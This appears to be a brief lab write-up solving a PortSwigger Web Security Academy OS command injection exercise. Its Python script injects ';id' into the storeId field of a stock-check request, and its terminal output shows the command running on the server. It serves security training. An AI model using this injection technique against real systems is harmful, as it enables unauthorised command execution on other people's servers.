
<img width="1206" height="850" alt="image" src="https://github.com/user-attachments/assets/a9d2eb51-b8bd-4528-8a27-459cef594941" />


<img width="1210" height="905" alt="image" src="https://github.com/user-attachments/assets/8be33718-fe81-490e-89c5-874de48a2c5f" />


<img width="1007" height="476" alt="Captura de pantalla 2026-07-29 014449" src="https://github.com/user-attachments/assets/95be5f8b-f4d5-4a04-ad5b-b34160630dbf" />

<img width="1206" height="487" alt="Captura de pantalla 2026-07-29 014517" src="https://github.com/user-attachments/assets/d71da119-96ae-4efe-8d7e-f687f2aa1b20" />


``` python

import requests

url = "https://0a48000b0484948180e83a8400030099.web-security-academy.net/"

try:
    command = ";id"
    r = requests.post(url + "/product/stock", data={"productId":"20" ,"storeId":f"{command}"})
    print(r.status_code)
    print(r.text)

except Exception as e:
      print(f"Error: {e}")

```

``` bash

❯ python3 exploit.py
200
uid=12001(peter-cPS6hy) gid=12001(peter) groups=12001(peter)

╭─ ~/portswigger/os-command-injection/level1                                                                       ✔ ─╮
╰─                                                                                                                   ─╯

```
